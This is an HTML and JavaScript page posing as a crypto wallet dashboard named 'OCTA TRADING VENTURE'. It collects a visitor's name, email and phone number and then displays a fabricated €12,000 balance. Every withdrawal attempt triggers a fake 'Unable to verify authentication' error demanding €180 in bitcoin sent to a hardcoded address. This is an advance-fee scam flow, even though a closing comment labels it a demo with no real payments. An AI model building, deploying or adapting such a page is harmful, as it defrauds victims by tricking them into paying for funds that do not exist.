<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>OCTA TRADING VENTURE</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#0a0a0a;
      --card:#0e0e10;
      --muted:#9aa3ad;
      --accent:#9b8cff;
      --accent-2:#8a5cff;
      --danger:#ff4d4f;
      --glass: rgba(255,255,255,0.02);
      --glass-2: rgba(255,255,255,0.015);
    }
    *{box-sizing:border-box;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;color:#e8eef6;}
    html,body{height:100%;margin:0;background:var(--bg);-webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;}
    .wrap{
      max-width:420px;
      margin:18px auto;
      padding:18px;
    }

    /* top bar */
    .topbar{
      display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;
    }
    .profile{
      display:flex;gap:12px;align-items:center;
    }
    .avatar{
      width:46px;height:46px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;color:#07111a;font-weight:700;
    }
    .user-meta{line-height:1;}
    .user-meta .handle{font-size:13px;color:var(--muted);}
    .user-meta .name{font-size:18px;font-weight:700;margin-top:2px;}

    /* card */
    .card{
      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:16px;padding:18px;overflow:hidden;
      box-shadow: 0 8px 30px rgba(0,0,0,0.6);
    }

    /* big balance */
    .balance-row{padding:12px 6px 18px 6px;}
    .balance-amount{font-size:44px;font-weight:700;letter-spacing:0.6px;}
    .balance-change{display:flex;gap:10px;align-items:center;margin-top:8px;}
    .change-amount{color:var(--danger);font-weight:700;}
    .change-pill{background:rgba(255,77,79,0.12);color:var(--danger);padding:6px 10px;border-radius:14px;font-weight:700;font-size:13px;}

    /* actions */
    .actions{
      display:flex;gap:12px;margin-top:18px;
    }
    .act-btn{
      flex:1;
      background:linear-gradient(180deg, rgba(255,255,255,0.015), transparent);
      border-radius:14px;padding:12px;display:flex;flex-direction:column;align-items:center;gap:8px;border:1px solid rgba(255,255,255,0.03);
      cursor:pointer;color:var(--muted);
    }
    .act-btn svg{width:22px;height:22px;opacity:0.95;fill:none;stroke:#bfbfff;stroke-width:1.5;}
    .act-btn span{font-size:13px;font-weight:600;color:var(--muted);}

    /* tokens list */
    .section-title{font-weight:700;margin-top:18px;margin-bottom:8px;font-size:16px;}
    .token{
      display:flex;align-items:center;justify-content:space-between;padding:12px;border-radius:12px;background:linear-gradient(180deg, rgba(255,255,255,0.01), transparent);margin-bottom:10px;border:1px solid rgba(255,255,255,0.02);
    }
    .token-left{display:flex;align-items:center;gap:12px;}
    .token-icon{width:44px;height:44px;border-radius:10px;background:#111;padding:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;}
    .token-info{line-height:1;}
    .token-info .label{font-weight:700;}
    .token-info .sub{color:var(--muted);font-size:13px;margin-top:4px;}
    .token-right{text-align:right;}
    .token-right .val{font-weight:700;}
    .token-right .delta{color:var(--danger);font-size:13px;margin-top:6px;}

    /* footer nav placeholder */
    .bottom-space{height:76px;}

    /* withdraw button */
    .withdraw-btn{
      margin-top:14px;background:linear-gradient(90deg,var(--accent-2),var(--accent));border:none;padding:12px;border-radius:12px;color:#05121a;font-weight:700;width:100%;cursor:pointer;
    }

    /* overlays */
    .overlay{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.6);z-index:60;}
    .reg-panel{width:92%;max-width:420px;background:linear-gradient(180deg,#0b0b0d,#0c0d0f);padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);}
    .reg-panel h3{margin:0 0 6px 0;}
    .field{display:flex;flex-direction:column;margin-bottom:12px;}
    .field label{font-size:13px;color:var(--muted);margin-bottom:6px;}
    .field input{padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);background:transparent;color:#e7f0fb;outline:none;}

    /* loading */
    .loading{display:flex;flex-direction:column;align-items:center;gap:12px;color:var(--muted);}
    .spinner{width:88px;height:88px;border-radius:50%;border:6px solid rgba(255,255,255,0.03);border-top-color:var(--accent);animation:spin 1s linear infinite;}
    @keyframes spin{to{transform:rotate(360deg)}}

    /* withdraw modal inside dashboard area (centered) */
    .modal-inner{
      position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);
      width:92%;max-width:380px;background:#0b0b0c;border-radius:12px;padding:16px;border:1px solid rgba(255,255,255,0.04);z-index:70;
      box-shadow:0 18px 60px rgba(0,0,0,0.7);
    }
    .modal-inner h4{margin:0 0 8px 0;}
    .modal-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:12px;}
    .btn-ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);padding:8px 10px;border-radius:10px;color:var(--muted);cursor:pointer;}
    .btn-primary{background:linear-gradient(90deg,var(--accent-2),var(--accent));border:none;padding:9px 12px;border-radius:10px;color:#06111a;font-weight:700;cursor:pointer;}

    /* dashboard error popup (centered within card) */
    .error-popup{
      position:absolute;left:50%;top:46%;transform:translate(-50%,-50%);
      width:90%;max-width:420px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:12px;padding:14px;border-left:6px solid var(--danger);z-index:100;box-shadow:0 18px 60px rgba(0,0,0,0.7);
    }
    .error-popup h4{margin:0 0 6px 0;color:#ffdede;}
    .error-popup p{margin:0;color:#ffdfe0;}
    .error-close{position:absolute;right:10px;top:8px;background:transparent;border:none;color:var(--muted);cursor:pointer;font-size:16px;}

    /* small helper */
    .muted{color:var(--muted);font-size:13px;}
    @media (max-width:460px){
      .balance-amount{font-size:36px}
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
      <div class="profile">
        <div class="avatar" id="avatarInitial">OT</div>
        <div class="user-meta">
          <div class="handle" id="userHandle">@octa_user</div>
          <div class="name" id="userName">OCTA TRADING VENTURE</div>
        </div>
      </div>
      <div style="display:flex;gap:12px;align-items:center">
        <button id="btnHistory" title="History" style="background:transparent;border:none;color:var(--muted);cursor:pointer;font-size:18px">‚è±</button>
        <button id="btnSearch" title="Search" style="background:transparent;border:none;color:var(--muted);cursor:pointer;font-size:18px">üîç</button>
      </div>
    </div>

    <div class="card" id="mainCard" style="position:relative;">
      <!-- Large balance -->
      <div class="balance-row">
        <div class="balance-amount" id="bigBalance">‚Ç¨0.00</div>
        <div class="balance-change">
          <div class="change-amount" id="changeValue">-‚Ç¨0.00</div>
          <div class="change-pill" id="changePct">-0.00%</div>
        </div>

        <!-- Actions -->
        <div class="actions" role="group" aria-label="main actions">
          <div class="act-btn" id="btnReceive">
            <!-- QR icon -->
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="4" height="4"/><rect x="8" y="3" width="4" height="4"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="8" width="4" height="4"/><path d="M8 14h8v7"/></svg>
            <span>Receive</span>
          </div>
          <div class="act-btn" id="btnSend">
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2L11 13"/><path d="M22 2l-7 20-4-9-9-4 20-7z"/></svg>
            <span>Send</span>
          </div>
          <div class="act-btn" id="btnSwap">
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7h12"/><path d="M3 7l4-4"/><path d="M21 17H9"/><path d="M21 17l-4 4"/></svg>
            <span>Swap</span>
          </div>
          <div class="act-btn" id="btnBuy">
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1v22"/><path d="M17 5H9a4 4 0 000 8h6a4 4 0 010 8H7"/></svg>
            <span>Buy</span>
          </div>
        </div>
      </div>

      <!-- Tokens -->
      <div style="padding:10px 6px 24px 6px;">
        <div class="section-title">Tokens</div>

        <div class="token">
          <div class="token-left">
            <div class="token-icon">Œû</div>
            <div class="token-info">
              <div class="label">Ethereum <span style="background:#2b2b2b;border-radius:8px;padding:4px 6px;margin-left:8px;font-size:12px;color:#cfd9ff">‚úì</span></div>
              <div class="sub">&lt; 0.00001 ETH</div>
            </div>
          </div>
          <div class="token-right">
            <div class="val">$0.01</div>
            <div class="delta">-&lt;$0.01</div>
          </div>
        </div>

        <div class="token">
          <div class="token-left">
            <div class="token-icon">S</div>
            <div class="token-info">
              <div class="label">Solana <span style="background:#2b2b2b;border-radius:8px;padding:4px 6px;margin-left:8px;font-size:12px;color:#cfd9ff">‚úì</span></div>
              <div class="sub">0 SOL</div>
            </div>
          </div>
          <div class="token-right">
            <div class="val">$0.00</div>
            <div class="delta">$0.00</div>
          </div>
        </div>

        <div class="token">
          <div class="token-left">
            <div class="token-icon">‚Çø</div>
            <div class="token-info">
              <div class="label">Bitcoin <span style="background:#2b2b2b;border-radius:8px;padding:4px 6px;margin-left:8px;font-size:12px;color:#cfd9ff">Taproot</span></div>
              <div class="sub">0 BTC</div>
            </div>
          </div>
          <div class="token-right">
            <div class="val">$0.00</div>
            <div class="delta">$0.00</div>
          </div>
        </div>

        <!-- Withdraw CTA -->
        <button class="withdraw-btn" id="openWithdraw">Withdraw</button>
      </div>

      <!-- Error popup (hidden by default) -->
      <div id="dashboardError" class="error-popup" style="display:none;">
        <button class="error-close" id="closeError" title="Close">‚úï</button>
        <h4>Unable to verify authentication</h4>
        <p id="errorText">‚Ç¨180 needed to confirm payment. Payment address should be this bc1q5mtqsh96qmnesfrn0dtc9je2e2ts904pnpswvc</p>
      </div>

      <!-- Withdraw modal inside the card (hidden) -->
      <div id="withdrawModal" class="modal-inner" style="display:none;">
        <h4>Withdraw funds</h4>
        <div class="muted" style="margin-bottom:10px">Type the destination address below. Amount will be set to your full available balance.</div>

        <div class="field">
          <label for="dstAddr">Payment address</label>
          <input id="dstAddr" type="text" placeholder="Enter BTC or ETH address" />
        </div>
        <div class="field">
          <label for="withdrawAmount">Amount (EUR)</label>
          <input id="withdrawAmount" type="text" disabled />
        </div>

        <div class="modal-actions">
          <button class="btn-ghost" id="cancelWithdraw">Cancel</button>
          <button class="btn-primary" id="confirmWithdraw">Confirm</button>
        </div>
      </div>

    </div>

    <div class="bottom-space"></div>
  </div>

  <!-- Registration overlay -->
  <div id="regOverlay" class="overlay" style="display:none;">
    <div class="reg-panel" role="dialog" aria-modal="true" aria-labelledby="regTitle">
      <h3 id="regTitle">Create an account</h3>
      <div class="muted" style="margin-bottom:12px">Register with your name, email and phone to start.</div>

      <div class="field">
        <label for="nameInput">Full name</label>
        <input id="nameInput" type="text" placeholder="full name" autocomplete="name" />
      </div>
      <div class="field">
        <label for="emailInput">Email</label>
        <input id="emailInput" type="email" placeholder="you@example.com" autocomplete="email" />
      </div>
      <div class="field">
        <label for="phoneInput">Phone</label>
        <input id="phoneInput" type="tel" placeholder="+0000010" autocomplete="tel" />
      </div>

      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:8px;">
        <button id="cancelRegBtn" class="btn-ghost">Cancel</button>
        <button id="confirmRegBtn" class="btn-primary">Confirm & Verify</button>
      </div>
    </div>
  </div>

  <!-- Loading overlay -->
  <div id="loadingScreen" class="overlay" style="display:none;">
    <div style="text-align:center;color:var(--muted);">
      <div class="spinner" aria-hidden="true"></div>
      <div style="margin-top:10px;font-weight:700">Preparing your workspace</div>
      <div style="margin-top:6px" class="muted">Please wait ‚Äî this takes a few seconds</div>
    </div>
  </div>

  <script>
    // Constants
    const DEMO_BALANCE = 12000.00;
    const ERROR_NEEDED = 180;
    const REQUIRED_ADDRESS = 'bc1q5mtqsh96qmnesfrn0dtc9je2e2ts904pnpswvc';

    // Elements
    const regOverlay = document.getElementById('regOverlay');
    const loadingScreen = document.getElementById('loadingScreen');
    const mainCard = document.getElementById('mainCard');
    const bigBalance = document.getElementById('bigBalance');
    const changeValue = document.getElementById('changeValue');
    const changePct = document.getElementById('changePct');
    const userNameEl = document.getElementById('userName');
    const userHandleEl = document.getElementById('userHandle');
    const avatarInitial = document.getElementById('avatarInitial');

    const openWithdrawBtn = document.getElementById('openWithdraw');
    const withdrawModal = document.getElementById('withdrawModal');
    const dstAddrInput = document.getElementById('dstAddr');
    const withdrawAmountInput = document.getElementById('withdrawAmount');
    const cancelWithdraw = document.getElementById('cancelWithdraw');
    const confirmWithdraw = document.getElementById('confirmWithdraw');

    const dashboardError = document.getElementById('dashboardError');
    const errorText = document.getElementById('errorText');
    const closeError = document.getElementById('closeError');

    // Registration elements
    const nameInput = document.getElementById('nameInput');
    const emailInput = document.getElementById('emailInput');
    const phoneInput = document.getElementById('phoneInput');
    const confirmRegBtn = document.getElementById('confirmRegBtn');
    const cancelRegBtn = document.getElementById('cancelRegBtn');

    // Storage helpers
    function getUser(){ try { return JSON.parse(localStorage.getItem('otv_user') || 'null'); } catch(e){return null;} }
    function setUser(u){ localStorage.setItem('otv_user', JSON.stringify(u)); }

    function formatEuro(amount){ return '‚Ç¨' + Number(amount).toLocaleString(undefined, {minimumFractionDigits:0, maximumFractionDigits:0}); }

    // Boot
    (function init(){
      const user = getUser();
      if (!user) {
        regOverlay.style.display = 'flex';
      } else {
        startLoadingThenEnter(user);
      }
    })();

    // Registration handlers
    confirmRegBtn.addEventListener('click', () => {
      const name = nameInput.value.trim();
      const email = emailInput.value.trim();
      const phone = phoneInput.value.trim();
      if (!name || !email || !phone) {
        alert('Please fill in name, email and phone to continue.');
        return;
      }
      const user = { name, email, phone, balance: DEMO_BALANCE };
      setUser(user);
      regOverlay.style.display = 'none';
      startLoadingThenEnter(user);
    });
    cancelRegBtn.addEventListener('click', ()=> {
      nameInput.value=''; emailInput.value=''; phoneInput.value='';
    });

    function startLoadingThenEnter(user){
      loadingScreen.style.display = 'flex';
      setTimeout(()=> {
        loadingScreen.style.display = 'none';
        enterDashboard(user);
      }, 6000);
    }

    function setHeaderForUser(user){
      userNameEl.textContent = user.name;
      // handle: use part of name lowercased without spaces for a faux handle
      const handle = user.name.split(' ')[0].toLowerCase() + (Math.floor(Math.random()*90)+10);
      userHandleEl.textContent = '@' + handle;
      avatarInitial.textContent = user.name.split(' ').map(s=>s[0]).slice(0,2).join('').toUpperCase();
    }

    function enterDashboard(user){
      setHeaderForUser(user);
      bigBalance.textContent = formatEuro(user.balance);
      // demo change values
      changeValue.textContent = '-‚Ç¨0.00043029';
      changePct.textContent = '-5.03%';
    }

    // Withdraw flow
    openWithdrawBtn.addEventListener('click', ()=> {
      const user = getUser();
      if (!user) return alert('No user found.');
      withdrawAmountInput.value = formatEuro(user.balance);
      dstAddrInput.value = ''; // user must type address themself
      withdrawModal.style.display = 'block';
    });
    cancelWithdraw.addEventListener('click', ()=> { withdrawModal.style.display = 'none'; });

    confirmWithdraw.addEventListener('click', ()=> {
      const addr = dstAddrInput.value.trim();
      if (!addr) {
        // show inline dashboard error to remind them to enter an address instead of toast
        showDashboardError('Please enter a destination address to continue.');
        return;
      }

      // For the demo, always show the specific authentication error message inside dashboard (centered popup)
      const msg = '‚Ç¨' + ERROR_NEEDED + ' needed to confirm payment. Payment address should be this ' + REQUIRED_ADDRESS;
      showDashboardError('Unable to verify authentication', msg);
      withdrawModal.style.display = 'none';
    });

    // Dashboard error controls
    function showDashboardError(title, message){
      if (!message) {
        // allow passing single combined string
        errorText.textContent = title;
        dashboardError.querySelector('h4').style.display = 'none';
      } else {
        dashboardError.querySelector('h4').textContent = title;
        dashboardError.querySelector('h4').style.display = '';
        errorText.textContent = message;
      }
      dashboardError.style.display = 'block';
      // focus for accessibility
      closeError.focus();
    }

    closeError.addEventListener('click', ()=> {
      dashboardError.style.display = 'none';
    });

    // Close overlays with Escape key
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        if (withdrawModal.style.display === 'block') withdrawModal.style.display = 'none';
        if (dashboardError.style.display === 'block') dashboardError.style.display = 'none';
      }
    });

    // Allow clicking Receive/Send for quick demo: Receive opens a small prompt; Send opens Withdraw modal
    document.getElementById('btnReceive').addEventListener('click', ()=> {
      const addr = prompt('Simulated receive address (for demo):', 'bc1qexampleaddress...');
      if (addr) alert('Simulated QR/receive address set to: ' + addr);
    });
    document.getElementById('btnSend').addEventListener('click', ()=> {
      openWithdrawBtn.click();
    });

    // For demo testing: if user had registered previously, fill UI immediately
    (function hydrateIfUser(){
      const u = getUser();
      if (u) {
        // If page loaded and user exists, show dashboard immediately without extra loading
        // But to preserve previous behavior, only hydrate if not currently showing loading/overlay
        const overlayVisible = regOverlay.style.display === 'flex' || loadingScreen.style.display === 'flex';
        if (!overlayVisible) enterDashboard(u);
      }
    })();

    // Note: this demo stores user info locally in localStorage. No network, no real payments.
  </script>
</body>
</html>
